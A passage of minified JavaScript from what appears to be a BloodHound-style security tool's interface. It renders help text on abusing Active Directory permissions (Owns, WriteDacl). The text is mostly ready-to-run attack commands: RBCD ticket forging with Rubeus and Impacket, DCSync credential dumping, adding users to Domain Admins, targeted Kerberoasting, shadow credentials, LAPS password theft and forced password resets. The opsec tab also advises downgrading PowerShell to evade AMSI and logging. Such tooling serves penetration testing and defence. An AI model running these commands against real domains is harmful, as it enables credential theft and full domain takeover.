objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"})]});case"Domain":return p(u,{children:[h(A,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),h(A,{variant:"body2",children:"Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain"}),h(A,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"})]});case"GPO":return p(u,{children:[h(A,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),h(A,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"})]});case"OU":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Organization Unit"}),h(A,{variant:"body2",children:"With ownership of the OU object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectACL, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):"}),h(A,{component:"pre",children:`Add-DomainObjectAcl -Credential $Cred -TargetIdentity ${o} -Rights All`}),h(A,{variant:"body2",children:"With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),p(A,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",r," is: ",o,"."]}),h(A,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),h(A,{component:"pre",children:"$Guids = Get-DomainGUIDMap\n$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name"}),h(A,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),h(A,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),h(A,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),h(A,{component:"pre",children:"$OU = Get-DomainOU -Raw (OU GUID)\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:'If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView\'s help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:'}),h(A,{component:"pre",children:"$Guids = Get-DomainGUIDMap\n$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n$OU = Get-DomainOU -Raw Workstations\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()"})]});default:return null}},linuxAbuse:({sourceName:e,sourceType:t,targetName:r,targetType:n,targetId:o,haslaps:a})=>{switch(n){case"Group":return p(u,{children:[h(A,{variant:"body1",children:" Modifying the rights "}),h(A,{variant:"body2",children:"To abuse ownership of a group object, you may grant yourself the AddMember privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body1",children:" Adding to the group "}),h(A,{variant:"body2",children:"You can now add members to the group."}),h(A,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),h(A,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),h(A,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),h(A,{variant:"body1",children:" Cleanup "}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"})]});case"User":return p(u,{children:[h(A,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" Targeted Kerberoast "}),p(A,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),h(A,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),h(A,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),h(A,{variant:"body1",children:" Force Change Password "}),h(A,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),h(A,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Computer":return p(u,a?{children:[h(A,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" Retrieve LAPS Password "}),h(A,{variant:"body2",children:"Full control of a computer object is abusable when the computer's local admin account credential is controlled with LAPS. The clear-text password for the local administrator account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With full control of the computer object, you may have the ability to read this attribute, or grant yourself the ability to read the attribute by modifying the computer object's security descriptor."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used to retrieve LAPS passwords:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}),h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]}:{children:[h(A,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" Resource-Based Constrained Delegation "}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, a new attacker-controlled computer account can be added with Impacket's addcomputer.py example script:"}),h(A,{component:"pre",children:"addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"}),h(A,{variant:"body2",children:"We now need to configure the target object so that the attacker-controlled computer can delegate to it. Impacket's rbcd.py script can be used for that purpose:"}),h(A,{component:"pre",children:"rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"}),h(A,{variant:"body2",children:'And finally we can get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket\'s getST.py example script can be used for that purpose.'}),h(A,{component:"pre",children:"getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"}),h(A,{variant:"body2",children:"This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the TARGETCOMPUTER."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/pywhisker",children:"pyWhisker"}),"."]}),h(A,{component:"pre",children:'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}),h(A,{variant:"body2",children:"For other optional parameters, view the pyWhisker documentation."})]});case"Domain":return p(u,{children:[h(A,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'DCSync' -rights 'FullControl' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" DCSync "}),p(A,{variant:"body2",children:["The AllExtendedRights privilege grants ",e," both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects from the domain ",r,"."]}),h(A,{variant:"body2",children:"This can be abused using Impacket's secretsdump.py example script:"}),h(A,{component:"pre",children:"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}),h(A,{variant:"body1",children:" Retrieve LAPS Passwords "}),p(A,{variant:"body2",children:["If FullControl (GenericAll) is obtained on the domain, instead of granting DCSync rights, the AllExtendedRights privilege included grants ",e," enough privileges to retrieve LAPS passwords domain-wise."]}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/p0dalirius/pyLAPS",children:"pyLAPS"})," ","can be used for that purpose:"]}),h(A,{component:"pre",children:'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'})]});case"GPO":return p(u,{children:[h(A,{variant:"body2",children:"To abuse ownership of a GPO, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),p(A,{variant:"body2",children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Organization Unit"}),h(A,{variant:"body2",children:"With ownership of the OU object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:'The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket\'s dacledit (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"Container":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Container"}),h(A,{variant:"body2",children:"With ownership of the container object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:'The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket\'s dacledit (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});default:return null}},opsec:()=>p(u,{children:[h(A,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),h(A,{variant:"body2",children:"Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request."}),h(A,{variant:"body2",children:"Additional opsec considerations depend on the target object and how to take advantage of this privilege. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm",children:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",children:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/group-policies",children:"https://www.thehacker.recipes/ad/movement/group-policies"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",children:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights",children:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights"})]})},WriteDacl:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," permissions to modify the DACL (Discretionary Access Control List) on the ",Cr(n)," ",r]}),h(A,{variant:"body2",children:"With write access to the target object's DACL, you can grant yourself any privilege you want on the object."})]}),windowsAbuse:({sourceName:e,sourceType:t,targetName:r,targetType:n,targetId:o,haslaps:a})=>{switch(n){case"Group":return p(u,{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a group object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:'Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),h(A,{variant:"body2",children:"You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember."}),h(A,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),h(A,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"}),h(A,{variant:"body2",children:"Cleanup for this can be done using Remove-DomainObjectAcl"}),h(A,{component:"pre",children:'Remove-DomainObjectAcl -Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers'})]});case"User":return p(u,{children:[h(A,{variant:"body2",children:"To abuse WriteDacl to a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),h(A,{variant:"body1",children:" Targeted Kerberoast "}),h(A,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as 